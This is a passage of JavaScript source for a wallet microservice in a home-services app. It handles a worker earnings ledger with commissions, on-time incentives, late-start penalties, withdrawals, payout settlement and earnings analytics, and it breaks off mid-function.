// HomeHelp Wallet Service
// -----------------------
// Owns the worker earnings LEDGER on its own Postgres (income/deductions/withdrawals/advances/
// payslips/notifications). It reacts to booking.completed (credit the worker's share),
// booking.cancelled (travel/visit compensation) and payout.completed (mark a withdrawal paid),
// and updates the worker's balance snapshot in the worker service via /internal. Serves the
// worker wallet screens and the admin wallet actions.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, internalGet, internalPost, internalOnly, tryGet, publishEvent, subscribeEvents, invalidateSettings,
  makeAdminAuth, requirePerm, getSetting, getSettingInt,
} from '@homehelp/shared'
// Imported directly, not via the shared index: it carries the jsonwebtoken dep.
import { tokenSubject, assertJwtSecret } from '@homehelp/shared/jwt.js'

assertJwtSecret('wallet') // refuse to boot without a signing secret rather than trust forgeable tokens

const PORT = Number(process.env.PORT || 4009)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5439/wallet'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')

// On-time-start rule: after accepting a job, the worker must START the service (enter the
// customer OTP) within START_WINDOW_MIN. On time → ON_TIME_INCENTIVE credited; otherwise
// LATE_PENALTY is deducted. Both land in the worker's wallet history.
const START_WINDOW_MIN = Number(process.env.START_WINDOW_MIN || 15)
const ON_TIME_INCENTIVE = Number(process.env.ONTIME_INCENTIVE || 15)
const LATE_PENALTY = Number(process.env.LATE_START_PENALTY || 15)

process.on('unhandledRejection', (e) => console.error('[wallet] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS worker_income (id SERIAL PRIMARY KEY, worker_id INTEGER, category TEXT, label TEXT, amount INTEGER, ref_id TEXT, bucket TEXT DEFAULT 'available', created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_deductions (id SERIAL PRIMARY KEY, worker_id INTEGER, category TEXT, label TEXT, amount INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_withdrawals (id SERIAL PRIMARY KEY, worker_id INTEGER, amount INTEGER, method TEXT, status TEXT DEFAULT 'Pending', reference TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_advances (id SERIAL PRIMARY KEY, worker_id INTEGER, amount INTEGER, outstanding INTEGER, status TEXT DEFAULT 'Pending', created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_payslips (id SERIAL PRIMARY KEY, worker_id INTEGER, month TEXT, gross INTEGER, deductions INTEGER, net INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_notifications (id SERIAL PRIMARY KEY, worker_id INTEGER, title TEXT, body TEXT, read BOOLEAN DEFAULT false, created TIMESTAMPTZ DEFAULT now())`,
    // Tracks the 15-min "start service by OTP" window per accepted job. resolved: NULL (pending),
    // 'incentive' (started on time), 'penalty' (started late / never started), 'skipped' (cancelled).
    `CREATE TABLE IF NOT EXISTS worker_start_deadlines (booking_id INTEGER PRIMARY KEY, worker_id INTEGER, ref TEXT, accepted_at TIMESTAMPTZ DEFAULT now(), deadline TIMESTAMPTZ, resolved TEXT)`,
    // Plain unique (NULLs are distinct in Postgres, so bonus/penalty rows with no ref_id are fine),
    // so `INSERT ... ON CONFLICT (worker_id, ref_id)` can use it as the arbiter for idempotent settlement.
    `DROP INDEX IF EXISTS ux_income_ref`,
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_income_ref ON worker_income(worker_id, ref_id)`,
    // Wallet PIN gates withdrawals (step 2 of the withdraw flow). Stored as a salted SHA-256
    // digest — never the PIN itself — with a lockout counter so a 4-digit space can't be walked.
    `CREATE TABLE IF NOT EXISTS worker_wallet_pin (
       worker_id INTEGER PRIMARY KEY,
       pin_hash TEXT NOT NULL,
       salt TEXT NOT NULL,
       fails INTEGER NOT NULL DEFAULT 0,
       locked_until TIMESTAMPTZ,
       updated TIMESTAMPTZ DEFAULT now()
     )`,
    `ALTER TABLE worker_withdrawals ADD COLUMN IF NOT EXISTS bank_account_id INTEGER`,
    `ALTER TABLE worker_withdrawals ADD COLUMN IF NOT EXISTS reference TEXT`,
    // Who credited this row: 'System' for the event-driven incentives/earnings the platform calculates
    // itself, or an admin's name for a manually granted bonus. Existing rows are all system-generated.
    `ALTER TABLE worker_income ADD COLUMN IF NOT EXISTS source TEXT DEFAULT 'System'`,
    // Same for deductions: 'System' for the automatic late/shift penalties, an admin's name when one
    // was applied by hand. This is the "Applied By" the admin panel shows.
    `ALTER TABLE worker_deductions ADD COLUMN IF NOT EXISTS source TEXT DEFAULT 'System'`,
    // Where the money actually went, snapshotted when the withdrawal is requested — the worker can
    // change their bank later, so reading it off the current profile would misreport old payouts.
    `ALTER TABLE worker_withdrawals ADD COLUMN IF NOT EXISTS destination TEXT`,
    // Bank UTR from the payout rail. Distinct from `reference` (the gateway's own payout id): the UTR
    // is what a worker's bank statement shows and what support quotes to trace the transfer.
    `ALTER TABLE worker_withdrawals ADD COLUMN IF NOT EXISTS utr TEXT`,
  ])
  console.log('[wallet] Postgres ready (worker earnings ledger)')
}

const commission = () => getSettingInt(ADMIN_URL, 'commission_percent', 20)

/* Phase 10: a worker may have their own commission, which overrides the platform-wide one.
 * The worker service owns the worker, so we ASK rather than keep a copy that drifts.
 *
 * On failure this falls back to the platform rate — the same number used before Phase 10 existed.
 * That matters: settleBooking runs on booking.completed, and a worker who finished a job must be
 * paid even if the worker service is briefly unreachable. Erring toward the default pays them;
 * erring toward zero would silently swallow their earnings.
 */
async function payConfig(workerId) {
  const platform = await commission()
  const cfg = await tryGet(WORKER_URL, `/api/internal/workers/${workerId}/pay-config`, null)
  if (!cfg) {
    console.error(`[wallet] pay-config unavailable for worker ${workerId} — settling at the platform rate (${platform}%)`)
    return { pct: platform, walletEnabled: true, inherited: true }
  }
  const own = cfg.commissionPercent
  const valid = Number.isInteger(own) && own >= 0 && own <= 100
  return {
    pct: valid ? own : platform,
    // A FIXED-salary worker earns no per-job share — payroll pays them monthly instead. Defaults to
    // true so an older/partial response behaves exactly as it did before fixed salaries existed.
    paysPerJob: cfg.paysPerJob !== false,
    perJobIncentive: Number(cfg.perJobIncentive) || 0,
    walletEnabled: cfg.walletEnabled !== false,
    inherited: !valid,
  }
}
const minPayoutLimit = () => getSettingInt(ADMIN_URL, 'min_payout_limit', 500)

/* ---------- payout policy ----------
 * There is NO auto-payout scheduler: a payout only moves when a worker requests one and an admin
 * (or auto-approval) releases it. payout_frequency/payout_day describe the org's stated policy and
 * are used ONLY to estimate the next payout date. 'on_demand' means "no schedule" → no estimate.
 */
const FREQ_LABEL = { daily: 'Daily', weekly: 'Weekly', fortnightly: 'Fortnightly', monthly: 'Monthly', on_demand: 'On demand' }
// Returns the next date the configured policy would pay on, as 'YYYY-MM-DD' in IST, or '' when
// there is no schedule to derive one from.
function nextPayoutDate(freq, day, from = new Date()) {
  const IST = 5.5 * 3600000
  const d = new Date(from.getTime() + IST) // shift so the date maths lands on the Indian calendar day
  const iso = (x) => x.toISOString().slice(0, 10)
  const plus = (n) => iso(new Date(d.getTime() + n * 86400000))
  if (freq === 'daily') return plus(1)
  if (freq === 'weekly' || freq === 'fortnightly') {
    const target = Math.min(6, Math.max(0, Number(day) || 0)) // 0=Sun … 6=Sat
    const ahead = ((target - d.getUTCDay() + 7) % 7) || 7      // always the NEXT one, never today
    return plus(freq === 'fortnightly' ? ahead + 7 : ahead)
  }
  if (freq === 'monthly') {
    const dom = Math.min(28, Math.max(1, Number(day) || 1))    // clamp to 28 so every month has it
    const next = new Date(Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), dom))
    if (next <= d) next.setUTCMonth(next.getUTCMonth() + 1)
    return iso(next)
  }
  return '' // on_demand / unknown → no schedule, so no honest estimate
}
const workerSnapshot = (wid) => tryGet(WORKER_URL, `/internal/workers/${wid}`, {})
const adjustBalance = (wid, delta) => internalPost(WORKER_URL, `/internal/workers/${wid}/balance`, delta).catch((e) => console.error('[wallet] balance adjust failed:', e.message))
async function notify(wid, title, body) { await pool.query('INSERT INTO worker_notifications (worker_id,title,body) VALUES ($1,$2,$3)', [wid, title, body]) }

// The booking's service name, e.g. "Kitchen Cleaning". `items` rides along on booking.completed
// (already JSON-parsed), so the ledger can describe a row without calling the booking service.
const serviceOf = (b) => (Array.isArray(b?.items) && b.items[0]?.name) || b?.type || ''

// Credit a worker's earnings for a completed booking (idempotent on ref_id).
async function settleBooking(b) {
  if (!b?.worker_id) return
  // Per-worker commission if one is set, else the platform rate. This is the number that decides
  // what the worker is actually paid, so Phase 10's setting has to be read HERE or it means nothing.
  const { pct, paysPerJob, perJobIncentive } = await payConfig(b.worker_id)
  // A fixed-salary worker earns no share — payroll pays them monthly, and also paying a share here
  // would pay them twice for the same work. The job is still recorded: the row is what makes this
  // idempotent, and their job count feeds metrics and their attendance bonus.
  const share = paysPerJob ? Math.max(0, Math.round(((b.total || 0) * (100 - pct)) / 100)) : 0
  if (paysPerJob && share <= 0) return
  // Label reads "Kitchen Cleaning · #HH10234" — the service name is what makes a ledger row
  // legible to an admin; the ref alone doesn't say what the worker was paid for.
  const svc = serviceOf(b)
  const ref = b.ref || `#${b.id}`
  // A ₹0 "Job Earnings" row would read as a job they weren't paid for. Say what it actually is.
  const category = paysPerJob ? 'Job Earnings' : 'Job Completed'
  const label = (svc ? `${svc} · ${ref}` : ref) + (paysPerJob ? '' : ' · covered by your salary')
  const ins = await pool.query(
    `INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,$2,$3,$4,$5,'available')
     ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
    [b.worker_id, category, label, share, String(b.id)])
  if (!ins.rowCount) return // already settled
  await adjustBalance(b.worker_id, { balance: share, earnings: share, jobs: 1 })

  // Per Job Incentive — a flat amount from the worker's incentive plan, on top of any share.
  // Idempotent on its own ref so it can't double-credit with the share.
  if (perJobIncentive > 0) {
    const incIns = await pool.query(
      `INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Incentive',$2,$3,$4,'available')
       ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
      [b.worker_id, `Per-job incentive · ${ref}`, perJobIncentive, `perjob-${b.id}`])
    if (incIns.rowCount) {
      await adjustBalance(b.worker_id, { balance: perJobIncentive, earnings: perJobIncentive })
      await notify(b.worker_id, 'Incentive credited', `+₹${perJobIncentive} for ${ref}`)
    }
  }
  await internalPost((process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, ''), `/api/internal/bookings/${b.id}/settled`, {}).catch(() => {})
  if (share > 0) {
    await notify(b.worker_id, 'Earnings credited', `₹${share} for ${b.ref || b.id}`)
    publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.credit', entityType: 'worker', entityId: b.worker_id, detail: `Credited ₹${share} for ${b.ref || b.id}`, meta: { amount: share } })
  }
}

/* ---------- on-time-start incentive / late-start penalty ---------- */
// Start (or reset) the 15-min start window when a job is accepted / auto-assigned.
async function openStartWindow({ bookingId, workerId, ref }) {
  if (!bookingId || !workerId) return
  await pool.query(
    `INSERT INTO worker_start_deadlines (booking_id, worker_id, ref, accepted_at, deadline, resolved)
     VALUES ($1, $2, $3, now(), now() + make_interval(mins => $4), NULL)
     ON CONFLICT (booking_id) DO UPDATE SET worker_id = EXCLUDED.worker_id, ref = EXCLUDED.ref,
       accepted_at = now(), deadline = EXCLUDED.deadline, resolved = NULL`,
    [bookingId, workerId, ref || `#${bookingId}`, START_WINDOW_MIN])
}

// Credit the on-time-start bonus (idempotent on ref_id → shows as a credit in wallet history).
async function creditOnTimeIncentive(row) {
  const ins = await pool.query(
    `INSERT INTO worker_income (worker_id, category, label, amount, ref_id, bucket)
     VALUES ($1, 'Incentive', $2, $3, $4, 'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
    [row.worker_id, `On-time start · ${row.ref}`, ON_TIME_INCENTIVE, `ontime-${row.booking_id}`])
  if (!ins.rowCount) return
  await adjustBalance(row.worker_id, { balance: ON_TIME_INCENTIVE, earnings: ON_TIME_INCENTIVE })
  await notify(row.worker_id, 'On-time bonus', `+₹${ON_TIME_INCENTIVE} for starting ${row.ref} within ${START_WINDOW_MIN} min`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.incentive', entityType: 'worker', entityId: row.worker_id, detail: `On-time start bonus ₹${ON_TIME_INCENTIVE} for ${row.ref}`, meta: { amount: ON_TIME_INCENTIVE } })
}

// Deduct the late-start penalty (shows as a debit in wallet history + the Deductions screen).
async function applyLatePenalty(row) {
  await pool.query(
    `INSERT INTO worker_deductions (worker_id, category, label, amount) VALUES ($1, 'Late Start Penalty', $2, $3)`,
    [row.worker_id, `Late start · ${row.ref} (not started within ${START_WINDOW_MIN} min)`, LATE_PENALTY])
  await adjustBalance(row.worker_id, { balance: -LATE_PENALTY })
  await notify(row.worker_id, 'Late-start penalty', `−₹${LATE_PENALTY}: service for ${row.ref} not started within ${START_WINDOW_MIN} min`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.penalty', entityType: 'worker', entityId: row.worker_id, detail: `Late-start penalty ₹${LATE_PENALTY} for ${row.ref}`, meta: { amount: LATE_PENALTY } })
}

// Worker started the service (OTP verified). Atomically claim the row so the sweep can't also fire.
async function resolveOnStart({ bookingId }) {
  if (!bookingId) return
  const row = (await pool.query(
    `UPDATE worker_start_deadlines SET resolved = CASE WHEN now() <= deadline THEN 'incentive' ELSE 'penalty' END
     WHERE booking_id = $1 AND resolved IS NULL RETURNING *`, [bookingId])).rows[0]
  if (!row) return // no window, or already resolved by the sweep
  if (row.resolved === 'incentive') await creditOnTimeIncentive(row)
  else await applyLatePenalty(row)
}

// Periodic sweep: penalize jobs accepted >15 min ago that were never started — but only if the
// booking is still assigned-and-not-started (skip cancelled / released / completed jobs).
const NOT_STARTED = ['worker_assigned', 'on_the_way', 'arrived']
async function sweepLateStarts() {
  const { rows } = await pool.query("SELECT * FROM worker_start_deadlines WHERE resolved IS NULL AND deadline < now()")
  for (const row of rows) {
    const b = await tryGet(BOOKING_URL, `/api/internal/bookings/${row.booking_id}`, null)
    const stillWaiting = NOT_STARTED.includes(b?.status)
    // Claim the row atomically (guards against a concurrent job.start resolving it).
    const claimed = (await pool.query(
      "UPDATE worker_start_deadlines SET resolved = $2 WHERE booking_id = $1 AND resolved IS NULL RETURNING *",
      [row.booking_id, stillWaiting ? 'penalty' : 'skipped'])).rows[0]
    if (claimed && stillWaiting) await applyLatePenalty(claimed)
  }
}

// ISO date/time parts for a ledger row (UTC — good enough for the demo history list).
function fmtDate(ts) { const d = new Date(ts); return { date: d.toISOString().slice(0, 10), time: d.toISOString().slice(11, 16) } }

/* ---------- ledger reference ids ----------
 * A stable, human-quotable id for one ledger row, e.g. TXN202607140006. Derived from the row's
 * own table id + date, so it is deterministic (same row → same id, forever) and unique: the id is
 * unique per table and the prefix identifies the table. Withdrawals do NOT use this — they carry
 * the real gateway reference from the payment service, which is the id that can actually be traced
 * with the bank.
 */
const REF_PREFIX = { 'Job Earnings': 'TXN', Incentive: 'INC', Bonus: 'BON', 'Sitara Bonus': 'BON', 'Min Guarantee': 'GUA', Compensation: 'CMP', Referral: 'REF' }
const ledgerRef = (prefix, created, id) => `${prefix}${fmtDate(created).date.replace(/-/g, '')}${String(id).padStart(4, '0')}`

// Human label for where a payout went, e.g. "HDFC Bank ••••5687" or a UPI handle. Snapshotted onto
// the withdrawal at request time so it stays true even after the worker changes their account.
const formatDest = (bank, method) => String(method || '').toLowerCase() === 'upi'
  ? (bank.bankUpi || 'Linked UPI')
  : (bank.bankAccount ? `${bank.bankName || 'Bank'} ••••${String(bank.bankAccount).slice(-4)}` : (bank.bankUpi || 'Bank account'))

// Unified, newest-first transaction history: earnings + incentives (credit), penalties/deductions
// and withdrawals (debit) — so the worker sees incentives AND deductions in one place.
async function historyLedger(wid) {
  const inc = (await pool.query('SELECT * FROM worker_income WHERE worker_id=$1', [wid])).rows
  const ded = (await pool.query('SELECT * FROM worker_deductions WHERE worker_id=$1', [wid])).rows
  const wds = (await pool.query('SELECT * FROM worker_withdrawals WHERE worker_id=$1', [wid])).rows
  const adv = (await pool.query('SELECT * FROM worker_advances WHERE worker_id=$1', [wid])).rows
  const out = []
  // `remarks` is the human description ("Kitchen Cleaning · #HH10234"); `reference` is the quotable
  // id for support. They are deliberately different things — refId is kept as-was for the worker app.
  // NOTE: status/type strings are part of the worker app's contract — WalletScreens.kt colours its
  // pills by exact match on 'Success'/'Paid'/'Cleared'. Don't rename them for an admin screen's
  // wording; the admin panel maps them to its own display labels.
  for (const r of inc) { const f = fmtDate(r.created); out.push({ id: r.id, ts: +new Date(r.created), date: f.date, time: f.time, type: r.category || 'Earnings', refId: r.label || r.ref_id || '', reference: ledgerRef(REF_PREFIX[r.category] || 'TXN', r.created, r.id), amount: r.amount, isCredit: true, status: 'Success', method: '', remarks: r.label || '', source: r.source || 'System' }) }
  for (const r of ded) { const f = fmtDate(r.created); out.push({ id: 200000 + r.id, ts: +new Date(r.created), date: f.date, time: f.time, type: r.category || 'Deduction', refId: r.label || '', reference: ledgerRef('DED', r.created, r.id), amount: r.amount, isCredit: false, status: 'Debited', method: '', remarks: r.label || '', source: r.source || 'System' }) }
  for (const r of wds) { const f = fmtDate(r.created); out.push({ id: 400000 + r.id, ts: +new Date(r.created), date: f.date, time: f.time, type: 'Withdrawal', refId: r.reference || '', reference: r.reference || ledgerRef('PAYOUT', r.created, r.id), amount: r.amount, isCredit: false, status: r.status || 'Pending', method: r.method || '', remarks: '' }) }
  for (const r of adv) { const f = fmtDate(r.created); out.push({ id: 600000 + r.id, ts: +new Date(r.created), date: f.date, time: f.time, type: 'Salary Advance', refId: '', reference: ledgerRef('ADV', r.created, r.id), amount: r.amount, isCredit: true, status: r.status || 'Approved', method: '', remarks: 'Recovered from future earnings' }) }
  out.sort((a, b) => b.ts - a.ts)
  return out.map(({ ts, ...e }) => e)
}

// Deductions grouped for the app's Deductions screen (summary by category + itemised detail).
async function deductionsDto(wid) {
  const rows = (await pool.query('SELECT * FROM worker_deductions WHERE worker_id=$1 ORDER BY id DESC', [wid])).rows
  const total = rows.reduce((s, r) => s + (r.amount || 0), 0)
  const byCat = new Map()
  for (const r of rows) byCat.set(r.category || 'Other', (byCat.get(r.category || 'Other') || 0) + (r.amount || 0))
  const summary = [...byCat.entries()].map(([category, amount]) => ({ category, amount }))
  const detail = rows.map((r) => ({ category: r.category || 'Other', label: r.label || '', amount: r.amount || 0, date: fmtDate(r.created).date }))
  return { summary, detail, total }
}

// Credit a month-end Shakti Bonus (idempotent per worker per month via ref_id).
// Everything is derived from the real LEDGER (worker_income / withdrawals / deductions), so the
// balance reflects only actual completed-service earnings — never a stale/seeded snapshot.
// Field names match the worker app's WalletSummaryDto (weekEarnings/monthEarnings/todayEarnings/
// hold/totalWithdrawn); legacy aliases (thisWeek/onHold/withdrawn) are kept for the admin panel.
async function summary(wid) {
  const s = async (sql) => (await pool.query(sql, [wid])).rows[0].s
  const earned = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1")
  const weekEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '7 days'")
  const monthEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '30 days'")
  const todayEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND (created AT TIME ZONE 'Asia/Kolkata')::date = (now() AT TIME ZONE 'Asia/Kolkata')::date")
  const totalWithdrawn = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_withdrawals WHERE worker_id=$1 AND status='Paid'")
  // Held = awaiting admin approval (Pending) or a payout in flight (Processing). Both reduce
  // the withdrawable balance so a worker can't request the same money twice before it lands.
  const hold = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_withdrawals WHERE worker_id=$1 AND status IN ('Pending','Processing')")
  const ded = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_deductions WHERE worker_id=$1")
  const advanceOutstanding = await s("SELECT COALESCE(SUM(COALESCE(outstanding, amount)),0)::int s FROM worker_advances WHERE worker_id=$1 AND status<>'Cleared'")
  const available = Math.max(0, earned - totalWithdrawn - hold - ded)
  const freq = await getSetting(ADMIN_URL, 'payout_frequency', 'weekly')
  const payoutDay = await getSettingInt(ADMIN_URL, 'payout_day', 4)
  const minPayout = await minPayoutLimit()
  const nextPayout = nextPayoutDate(freq, payoutDay)
  // Prior periods, so the wallet can show "+15% vs yesterday" honestly. Each window is the same
  // LENGTH as the one it compares against (rolling, matching weekEarnings/monthEarnings above) —
  // comparing a rolling 30 days against a calendar month would flatter or punish at random.
  const yesterdayEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND (created AT TIME ZONE 'Asia/Kolkata')::date = (now() AT TIME ZONE 'Asia/Kolkata')::date - 1")
  const lastWeekEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '14 days' AND created <= now()-interval '7 days'")
  const lastMonthEarnings = await s("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '60 days' AND created <= now()-interval '30 days'")
  return {
    available, pending: 0, hold, onHold: hold,
    totalEarned: earned, totalWithdrawn, withdrawn: totalWithdrawn,
    advanceOutstanding, todayEarnings, weekEarnings, monthEarnings,
    yesterdayEarnings, lastWeekEarnings, lastMonthEarnings,
    thisWeek: weekEarnings, thisMonth: monthEarnings,
    // Payout policy (see nextPayoutDate). nextPayout is an ESTIMATE from the configured schedule,
    // not a commitment — nothing pays automatically. nextPayoutEst is what would be withdrawable,
    // and is only meaningful once it clears the minimum.
    nextPayout,
    nextPayoutEst: available >= minPayout ? available : 0,
    payoutFrequency: FREQ_LABEL[freq] || 'On demand',
    minPayoutLimit: minPayout,
  }
}

// Record the gateway's payout reference (RazorpayX pout_… / MOCK-…) against the withdrawal. This is
// the only way the id reaches the ledger — the payment service owns it and reports it on the event.
// COALESCE so an event without a reference can never blank one we already have.
async function setPayoutReference(withdrawalId, reference, utr) {
  if (!reference && !utr) return
  await pool.query('UPDATE worker_withdrawals SET reference=COALESCE($2, reference), utr=COALESCE($3, utr) WHERE id=$1', [withdrawalId, reference || null, utr || null])
}

// ── Wallet analytics (3_wallet.png): trend · service-wise · settlement · leaderboard ──────────

/** Daily earnings for the last [days] days, oldest first. Days with nothing earned return 0. */
async function earningsTrend(wid, days = 30) {
  const q = await pool.query(
    `SELECT to_char(d.day, 'YYYY-MM-DD') date,
            COALESCE(SUM(i.amount), 0)::int amount
       FROM generate_series(
              ((now() AT TIME ZONE 'Asia/Kolkata')::date - ($2::int - 1)),
              (now() AT TIME ZONE 'Asia/Kolkata')::date,
              interval '1 day') d(day)
       LEFT JOIN worker_income i
         ON i.worker_id = $1
        AND (i.created AT TIME ZONE 'Asia/Kolkata')::date = d.day
      GROUP BY d.day ORDER BY d.day`,
    [wid, days])
  return q.rows
}

/**
 * Earnings grouped by the service that produced them.
 *
 * `label` on a Job Earnings row comes in three shapes, because the format has changed over time:
 *   "Kitchen Cleaning · #HH42064"  — current: settleBooking() writes "<service> · <ref>"
 *   "#HH42064"                     — older rows: the booking ref alone
 *   "Kitchen Cleaning"             — older/seeded rows: the service name outright
 * Take the service name straight off the current shape, resolve a bare ref against the booking,
 * and treat anything else at face value. Whatever is still unresolved groups as "Other Services"
 * rather than being dropped, so the parts always sum to the total the worker actually earned.
 */
const looksLikeRef = (v) => /^(#|SEED-)/i.test(String(v || '').trim())
// "<service> · <ref>" → "<service>". Returns '' for any other shape.
const serviceFromLabel = (v) => {
  const [head, ...rest] = String(v || '').split(' · ')
  return rest.length && !looksLikeRef(head) ? head.trim() : ''
}

async function serviceWiseEarnings(wid) {
  const rows = (await pool.query(
    "SELECT label, SUM(amount)::int amount FROM worker_income WHERE worker_id=$1 AND category='Job Earnings' GROUP BY label", [wid])).rows
  if (!rows.length) return { total: 0, services: [] }
  const byRef = new Map()
  if (rows.some((r) => looksLikeRef(r.label))) {
    const bookings = await tryGet(BOOKING_URL, `/api/internal/bookings?worker_id=${wid}`, [])
    for (const b of bookings || []) byRef.set(String(b.ref || `#${b.id}`), (b.items || []).map((i) => i.name).join(', '))
  }
  const acc = new Map()
  for (const r of rows) {
    const label = String(r.label || '').trim()
    const name = serviceFromLabel(label) || (looksLikeRef(label) ? byRef.get(label) : label) || 'Other Services'
    acc.set(name, (acc.get(name) || 0) + Number(r.amount || 0))
  }
  const total = [...acc.values()].reduce((t, v) => t + v, 0)
  const services = [...acc.entries()]
    .map(([service, amount]) => ({ service, amount, pct: total ? Math.round((amount * 100) / total) : 0 }))
    .sort((a, b) => b.amount - a.amount)
  return { total, services }
}

/** Payout rules + the worker's payout destination, as the Settlement Info card shows them. */
async function settlementInfo(wid) {
  // Source of truth is the worker service's payout view: the worker's chosen rules plus their
  // real payout accounts (worker_bank_accounts). The legacy profile.bank blob is no longer written
  // by the wallet flow — reading it here is what made the card claim "Settlement Mode: Not set"
  // while showing a verified account beside it.
  const payout = await tryGet(WORKER_URL, `/internal/workers/${wid}/payout`, null)
  const st = payout?.settings || {}
  const acct = payout?.default || (payout?.accounts || []).find((a) => a.verified) || (payout?.accounts || [])[0] || null
  // The card MUST show the minimum the withdrawal endpoint actually enforces — the higher of the
  // admin's global limit and the worker's own setting — or it would promise a smaller minimum than
  // the server will accept.
  const adminMin = await minPayoutLimit()
  return {
    dailyTime: st.settlementTime || '07:00 AM',
    frequency: st.weeklySettlement ? 'Weekly' : (st.dailySettlement ? 'Daily' : 'Manual'),
    minPayout: Math.max(adminMin, Number(st.minPayout) || 0),
    autoWithdraw: !!st.autoWithdraw,
    mode: acct ? (acct.upi && !acct.account ? 'UPI' : 'Bank Transfer') : 'Not set',
    bankAccount: acct ? acct.accountMasked || acct.upi : '',
    bankName: acct?.bankName || '',
    bankVerified: !!acct?.verified,
    bankStatus: acct ? acct.status : 'Not added',
  }
}

/**
 * Where this worker sits against the others this month, by earnings. Real ranking over the
 * ledger — "Top 20%" means 80% of active earners earned less. Returns null when there aren't
 * enough peers for the claim to mean anything.
 */
async function leaderboard(wid) {
  const rows = (await pool.query(
    `SELECT worker_id, SUM(amount)::int total FROM worker_income
      WHERE created > now()-interval '30 days' GROUP BY worker_id ORDER BY total DESC`)).rows
  if (rows.length < 3) return null
  const idx = rows.findIndex((r) => Number(r.worker_id) === Number(wid))
  if (idx < 0) return null
  const topPct = Math.max(1, Math.round(((idx + 1) / rows.length) * 100))
  return { rank: idx + 1, of: rows.length, topPercent: topPct }
}

// Finalize a withdrawal once the payout service reports back. Idempotent (terminal states are
// left untouched) so a redelivered event can't refund or pay twice. ok=true → money left the
// held bucket for good; ok=false → the payout bounced, so release the hold back to the balance.
async function finalizePayout(withdrawalId, ok, reason, reference, utr) {
  const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1', [withdrawalId])).rows[0]
  if (!w || ['Paid', 'Failed', 'Rejected'].includes(w.status)) return
  if (ok) {
    await pool.query("UPDATE worker_withdrawals SET status='Paid', reference=COALESCE($2, reference), utr=COALESCE($3, utr) WHERE id=$1", [withdrawalId, reference || null, utr || null])
    await adjustBalance(w.worker_id, { hold: -w.amount, withdrawn: w.amount })
    publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.payout', entityType: 'worker', entityId: w.worker_id, detail: `Payout ₹${w.amount} completed (withdrawal #${withdrawalId})`, meta: { amount: w.amount } })
  } else {
    await pool.query("UPDATE worker_withdrawals SET status='Failed', reference=COALESCE($2, reference), utr=COALESCE($3, utr) WHERE id=$1", [withdrawalId, reference || null, utr || null])
    await adjustBalance(w.worker_id, { hold: -w.amount, balance: w.amount })
    publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.payout', entityType: 'worker', entityId: w.worker_id, detail: `Payout ₹${w.amount} failed (${reason || 'bank error'}) — refunded to balance`, meta: { amount: w.amount } })
  }
}
const rowsFor = async (table, wid) => (await pool.query(`SELECT * FROM ${table} WHERE worker_id=$1 ORDER BY id DESC`, [wid])).rows
const earningsBreakupDto = async (wid) => (await pool.query(
  "SELECT category, SUM(amount)::int amount FROM worker_income WHERE worker_id=$1 GROUP BY category ORDER BY amount DESC", [wid])).rows
async function walletState(wid) {
  return {
    walletSummary: await summary(wid),
    earningsBreakup: await earningsBreakupDto(wid),
    deductions: await deductionsDto(wid),
    history: await historyLedger(wid),
    withdrawals: (await rowsFor('worker_withdrawals', wid)).map((r) => ({
      id: r.id, amount: r.amount, method: r.method || '', destination: r.destination || '',
      status: r.status || 'Pending', remarks: '',
      // payoutId identifies the row in our ledger; reference is the gateway's payout id; utr is the
      // bank's transfer number (only exists once a real rail actually moves the money).
      payoutId: ledgerRef('PAYOUT', r.created, r.id), reference: r.reference || '', utr: r.utr || '',
      date: fmtDate(r.created).date, time: fmtDate(r.created).time,
    })),
